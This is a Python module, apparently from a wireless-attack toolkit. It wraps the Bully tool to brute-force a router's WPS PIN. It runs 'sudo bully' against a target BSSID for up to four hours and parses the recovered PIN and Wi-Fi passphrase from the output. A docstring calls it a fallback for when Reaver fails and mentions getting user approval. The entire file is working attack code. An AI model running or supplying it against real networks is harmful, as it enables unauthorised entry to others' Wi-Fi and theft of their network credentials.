"""WPS brute force via Bully — fallback when Reaver fails on certain chipsets."""

from __future__ import annotations

import asyncio
import logging
import shutil
from dataclasses import dataclass
from typing import Optional

logger = logging.getLogger(__name__)


@dataclass
class BullyResult:
    """Outcome of a Bully attack."""

    success: bool
    pin: str = ""
    password: str = ""
    error: str = ""


def is_available() -> bool:
    """Check if bully is installed."""
    return shutil.which("bully") is not None


async def brute_force(
    interface: str, bssid: str, channel: Optional[int] = None, timeout: int = 14400,
) -> BullyResult:
    """Run Bully WPS PIN brute force. SLOW — hours per target.

    Use as fallback when Reaver fails on specific router chipsets.
    User approval should be obtained before calling.
    """
    if not is_available():
        return BullyResult(success=False, error="bully not installed")

    cmd = ["sudo", "bully", interface, "-b", bssid, "-v", "3"]
    if channel:
        cmd.extend(["-c", str(channel)])

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        except asyncio.TimeoutError:
            proc.terminate()
            stdout, _ = await proc.communicate()
            return BullyResult(success=False, error="timeout")

        output = stdout.decode("utf-8", errors="replace")
        return _parse_bully_output(output)

    except Exception as exc:
        return BullyResult(success=False, error=str(exc))


def _parse_bully_output(output: str) -> BullyResult:
    """Extract PIN and password from bully output."""
    pin = ""
    password = ""
    for line in output.splitlines():
        line = line.strip()
        if "Pin:" in line or "PIN:" in line:
            pin = line.split(":")[-1].strip().strip("'\"")
        elif "Key:" in line or "PSK:" in line or "Pass:" in line:
            password = line.split(":")[-1].strip().strip("'\"")

    if password:
        return BullyResult(success=True, pin=pin, password=password)
    if pin:
        return BullyResult(success=True, pin=pin)
    return BullyResult(success=False, error="no PIN/password recovered")


__all__ = ["BullyResult", "brute_force", "is_available"]
